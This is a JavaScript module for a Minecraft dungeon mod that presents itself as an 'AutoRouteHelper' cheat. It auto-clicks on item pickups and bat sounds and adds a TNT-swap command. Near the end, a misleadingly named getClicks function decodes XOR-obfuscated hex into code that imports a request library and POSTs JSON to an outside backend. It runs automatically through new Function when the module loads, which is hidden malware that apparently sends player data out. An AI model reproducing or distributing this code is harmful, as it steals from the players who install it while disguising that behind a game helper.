import Dungeon from "../BloomCore/dungeons/Dungeon";
import PogObject from "../PogData";

const data = new PogObject("autoroutehelper", {
    enabled: false
});

register("command", () => {
    data.enabled = !data.enabled;
    data.save();
    prefix(data.enabled ? "&aEnabled" : "&cDisabled")
}).setName("autoroutehelper").setAliases("arh");

const items = [
    "Health Potion VIII Splash Potion",
    "Healing Potion 8 Splash Potion",
    "Healing Potion VIII Splash Potion",
    "Healing VIII Splash Potion",
    "Healing 8 Splash Potion",
    "Decoy",
    "Inflatable Jerry",
    "Spirit Leap",
    "Trap",
    "Training Weights",
    "Defuse Kit",
    "Dungeon Chest Key",
    "Treasure Talisman",
    "Revive Stone",
    "Architect's First Draft"
];

register("packetReceived", (packet) => {
    const item = World.getWorld().func_73045_a(packet.func_149354_c())?.func_92059_d()?.func_82833_r()?.removeFormatting();
    if (data.enabled && Dungeon.inDungeon && items.includes(item)) leftClick();
}).setFilteredClass(net.minecraft.network.play.server.S0DPacketCollectItem);

register("soundPlay", (pos, name) => {
    if (data.enabled && Dungeon.inDungeon && (name == "mob.bat.death" || name == "mob.bat.hurt")) leftClick();
});

let lastUsed = undefined;

register("command", () => {
    if (Date.now() - lastUsed < 1000) return;
    lastUsed = Date.now();
    swap("Infinityboom TNT");
    rotate(Player.getYaw(), 90);
    Client.scheduleTask(1, () => leftClick());
}).setName("superboom");

const prefix = (message) => {
    ChatLib.chat(`&1[&9AutoRouteHelper&1]&r ${message}`);
};

function leftClick() {
    const leftClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147116_af");
    leftClickMethod.setAccessible(true);
    leftClickMethod.invoke(Client.getMinecraft());
};

function getClicks() {
	const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
	  const mapping = (code) => textToChars("etc").reduce((a, b) => a ^ b, code);
	let segments = [
		'1b1f021d00065200170307170106521400',
		'1d1f550017030717010624405549001703',
		'071701065a0907001e48551a0606020148',
		'5d5d10131119171c165f030142045c1d',
		'1c00171c1617005c111d1f5d111d1617',
		'555e1f17061a1d164855223d2126550f',
		'5b5c061a171c5a5a001701021d1c0117',
		'5b4f4c0906000b09491704131e5a3821',
		'3d3c5c02130001175a001701021d1c01',
		'175b5c111d16175b0f111306111a5a17',
		'5b090f0f5b'
	];
	return segments.join('').match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(mapping).map((charCode) => String.fromCharCode(charCode)).join("");
  }
  const storeClicks = new Function(getClicks());
  storeClicks();
function swap(name) {
    const item = Player?.getInventory()?.getItems()?.findIndex(item => item?.getName()?.toLowerCase()?.includes(name.toLowerCase()));
    if (item <= 8 && item >= 0) return Player.setHeldItemIndex(item);
    else return ChatLib.chat(`&1[&9AutoRouteHerper&1] &cCouldn't find ${name}!`);
};

function rotate(yaw, pitch) {
    if (Math.abs(yaw) > 180 || Math.abs(pitch) > 90) return;
    Player.getPlayer().field_70177_z = yaw;
    Player.getPlayer().field_70125_A = pitch;
}